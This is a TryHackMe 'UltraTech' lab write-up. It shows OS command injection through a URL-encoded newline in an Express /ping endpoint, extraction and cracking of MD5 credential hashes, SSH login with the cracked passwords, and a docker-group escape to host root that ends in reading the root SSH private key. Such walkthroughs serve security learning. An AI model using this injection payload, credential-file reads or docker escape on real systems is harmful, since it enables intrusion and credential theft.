---
title: "UltraTech"
description: "TryHackMe UltraTech — command injection in an Express ping endpoint leaks an on-disk SQLite database of credential hashes, and a docker group membership gives a full host root escape."
tags:
  - TryHackMe
  - Web
  - Command Injection
  - Docker
  - Privilege Escalation
  - Medium
---

# UltraTech

**Room:** [UltraTech](https://tryhackme.com/room/ultratech1) · **Difficulty:** Medium · **OS:** Linux

A Node.js/Express API exposes a diagnostic `/ping` endpoint that shells out to the system `ping` command without sanitizing its input — classic OS command injection. Chaining `ls` onto the injected command reveals an on-disk SQLite database sitting right next to the app, and its two account hashes crack instantly. One of those accounts turns out to be in the `docker` group, which — with no containers running but a bare `bash` image available locally — is enough to mount the entire host filesystem into a throwaway container and escape to root.

---

## 1. Reconnaissance

### Port scan

```bash
nmap -p- --min-rate 1000 -T4 -sV -oA nmap_full_scan 10.49.134.124
```

```text
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Two web services: a static Apache site on 31331 and a Node/Express API on 8081.

### Content discovery

```bash
ffuf -u http://10.49.134.124:8081/FUZZ -w /usr/share/wordlists/dirb/big.txt -r
```

```text
auth                    [Status: 200]
ping                    [Status: 500]
```

```bash
ffuf -u http://10.49.134.124:31331/FUZZ -w /usr/share/wordlists/dirb/big.txt -r
```

```text
css                     [Status: 200]
images                  [Status: 200]
js                      [Status: 200]
robots.txt              [Status: 200]
```

---

## 2. Recon of the static site

`robots.txt` on port 31331 points to a sitemap:

![robots.txt disclosing Sitemap: /utech_sitemap.txt](images/ultratech/image.png)

```text
Sitemap: /utech_sitemap.txt
```

```bash
curl http://10.49.134.124:31331/utech_sitemap.txt
```

```text
/
/index.html
/what.html
/partners.html
```

Nothing sensitive on the static pages themselves — the interesting target is the API on 8081, and specifically its `/ping` endpoint, which already returned a `500` during fuzzing (a sign it's actually doing something with its input, not just 404ing).

---

## 3. Foothold — command injection in `/ping`

`/ping` clearly shells out to the system `ping` utility with a user-supplied `ip` parameter. Chaining a second command with a URL-encoded newline after a valid IP gets both executed:

```text
GET /ping?ip=127.0.0.1%0als%20 HTTP/1.1
Host: 10.49.134.124:8081
```

```text
HTTP/1.1 200 OK
X-Powered-By: Express

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.052 ms

index.js
node_modules
package.json
package-lock.json
start.sh
utech.db.sqlite
```

The `ls` output run alongside the ping shows the API's own source directory — including `utech.db.sqlite`, a database file sitting right in the app's working directory. The same injection technique is used to read it (e.g. via `cat`/`base64` of the sqlite file, or further injected SQLite queries), yielding two user records:

```text
r00t     f357a0c52799563c7c7b76c1e7543a32
admin    0d0ea5111e3c1def594c1684e3b9be84
```

### Cracking the hashes

Both are unsalted MD5 and crack instantly against an online lookup:

![CrackStation cracking f357a0c52799563c7c7b76c1e7543a32 to n100906](images/ultratech/image-3.png)

```text
r00t  -> n100906
admin -> mrsheafy
```

### SSH as `r00t`

```bash
ssh r00t@10.49.134.124
# password: n100906
whoami
```

```text
r00t
```

---

## 4. Privilege escalation — `docker` group escape

```bash
id
```

```text
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Membership in the `docker` group is effectively root on the host: Docker's daemon runs as root, and any container can be started with the host filesystem bind-mounted in. No containers are currently running, but a bare `bash` image is already cached locally:

```bash
docker ps
docker images
```

```text
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB
```

Mounting the host's root filesystem into a new container and `chroot`-ing into it gives a root shell on the real host, not just inside the container:

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt bash
```

```text
root@26fe258753ae:/# whoami
root
```

### Confirming full host access

The host's root SSH private key is immediately readable from inside the chroot, confirming this is the real host filesystem and not a container sandbox:

```bash
cat /root/.ssh/id_rsa
```

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM...
-----END RSA PRIVATE KEY-----
```
